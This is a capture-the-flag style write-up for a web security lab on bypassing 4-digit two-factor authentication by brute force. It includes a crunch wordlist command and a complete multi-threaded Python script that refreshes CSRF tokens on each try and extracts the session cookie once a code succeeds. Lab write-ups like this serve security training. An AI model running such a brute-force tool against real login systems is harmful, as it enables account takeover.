# Lab: 2FA bypass using a brute-force attack

EXPERT

<br>

# Theory

To brute force a login or multi-step form protected by an anti-CSRF token, the automated tool must extract a fresh CSRF token from the server's response before sending each new credential attempt. Because anti-CSRF tokens change per request or session, a standard brute force attack fails as the server rejects older, reused tokens

[Medium Article](https://medium.com/@amyrahm786/bypassing-csrf-token-8e0dba04ec27)

<br>

# Method

I guess the method here is pretty much self explanatory.

**Note** Burp macros can be used to complete this lab as well.

So, we forge our csrf brute force tool in python, but first, we need a set of 4 digit mfa codes 

```
Login -> Submit random code -> Lab Says [ Incorrect security code
                                           Please enter your 4-digit security code ]
```
So, we can do that with the seclist 4-digit code, as well as make our own wordlist of 4 digit codes with crunch as

```bash
crunch 0123456789 -o 4DigiCode.txt
```

Now, scripting

```python3
import concurrent.futures
import requests
from bs4 import BeautifulSoup
import signal
import sys
import os

# Configuration
TARGET_URL = "https://<Lab-ID>.web-security-academy.net"
LOGIN1_URL = f"{TARGET_URL}/login"
LOGIN2_URL = f"{TARGET_URL}/login2"

USERNAME = "carlos"
PASSWORD = "montoya"
MFA_FILE = "4DigiCode.txt"
MAX_THREADS = 30  # Balance speed here

# Shared flag to stop threads when the match is found or Ctrl+C happens
SUCCESS_FOUND = False
GLOBAL_SHUTDOWN = False

def attempt_mfa(mfa_code, index, total):
    global SUCCESS_FOUND, GLOBAL_SHUTDOWN
    # Instantly exit if success was found or if user cancelled via Ctrl+C
    if SUCCESS_FOUND or GLOBAL_SHUTDOWN:
        return None

    session = requests.Session()
    
    try:
        # ----------------------------------------------------
        # STEP 1: GET LOGIN 1 PAGE & EXTRACT CSRF
        # ----------------------------------------------------
        res_login1_get = session.get(LOGIN1_URL, timeout=10)
        if GLOBAL_SHUTDOWN: return None
        soup1 = BeautifulSoup(res_login1_get.text, 'html.parser')
        csrf_login1 = soup1.find('input', {'name': 'csrf'})['value']
        
        # ----------------------------------------------------
        # STEP 2: SUBMIT LOGIN 1 CREDENTIALS
        # ----------------------------------------------------
        payload_login1 = {
            'username': USERNAME,
            'password': PASSWORD,
            'csrf': csrf_login1
        }
        session.post(LOGIN1_URL, data=payload_login1, timeout=10)
        if GLOBAL_SHUTDOWN: return None
        
        # ----------------------------------------------------
        # STEP 3: GET LOGIN 2 PAGE & EXTRACT NEW CSRF
        # ----------------------------------------------------
        res_login2_get = session.get(LOGIN2_URL, timeout=10)
        if GLOBAL_SHUTDOWN: return None
        soup2 = BeautifulSoup(res_login2_get.text, 'html.parser')
        csrf_login2 = soup2.find('input', {'name': 'csrf'})['value']
        
        # ----------------------------------------------------
        # STEP 4: SUBMIT MFA CODE TO LOGIN 2
        # ----------------------------------------------------
        payload_login2 = {
            'mfa-code': mfa_code,
            'csrf': csrf_login2
        }
        res_login2_post = session.post(LOGIN2_URL, data=payload_login2, allow_redirects=False, timeout=10)
        
        # ----------------------------------------------------
        # STEP 5: VERIFY SUCCESS
        # ----------------------------------------------------
        redirect_target = res_login2_post.headers.get('Location', '')
        if res_login2_post.status_code == 302 and "/my-account" in redirect_target:
            SUCCESS_FOUND = True
            session_cookie = session.cookies.get('session')
            return {
                "status": "success",
                "code": mfa_code,
                "cookie": session_cookie,
                "headers": dict(res_login2_post.headers)
            }
        
        print(f"[{index}/{total}] Failed: {mfa_code}")
        return {"status": "failed"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

def hndlCtrlC(signum, frame):
    global GLOBAL_SHUTDOWN
    print("\n[-] CTRL+C detected, shutting down workers...\n[*] Hold on a sec...")
    GLOBAL_SHUTDOWN = True
    # Force kill the main process instantly to prevent hanging threads from finishing
    os._exit(0) 

# Register the signal handler
signal.signal(signal.SIGINT, hndlCtrlC)

def main():
    with open(MFA_FILE, "r") as infile:
        mfa_codes = infile.read().splitlines()

    print(f"[*] Loaded {len(mfa_codes)} codes. Launching multi-threaded execution...")
    total_codes = len(mfa_codes)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {
            executor.submit(attempt_mfa, code, idx + 1, total_codes): code 
            for idx, code in enumerate(mfa_codes)
        }
        
        success = False
        try:
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result and result.get("status") == "success":
                    print("\n" + "="*50)
                    print(f"[+] SUCCESS! Valid MFA Code found: {result['code']}")
                    print(f"[+] Direct Response Cookie: {result['headers'].get('Set-Cookie')}")
                    print(f"[+] Extracted Session Token: session={result['cookie']}")
                    print("="*50)
                    success = True
                    
                    # Kill remaining futures cleanly
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
        except KeyboardInterrupt:
            pass

    # Only print failure summary if loop finishes entirely without success
    if not success and not GLOBAL_SHUTDOWN:
        print("\n[-] Brute-force finished. No valid MFA code found.")

if __name__ == "__main__":
    main()

```

Make the necessary changes to the script and run it.

We should get results similar to
```
==================================================
[+] SUCCESS! Valid MFA Code found: 1029
[+] Direct Response Cookie: session=mCBUnqHOdF996YwwNEBePaGrUI624o5g; Secure; HttpOnly; SameSite=None
[+] Extracted Session Token: session=mCBUnqHOdF996YwwNEBePaGrUI624o5g
==================================================
```

Make a get request to /my-account, intercept it and change the session parameter to complete the lab
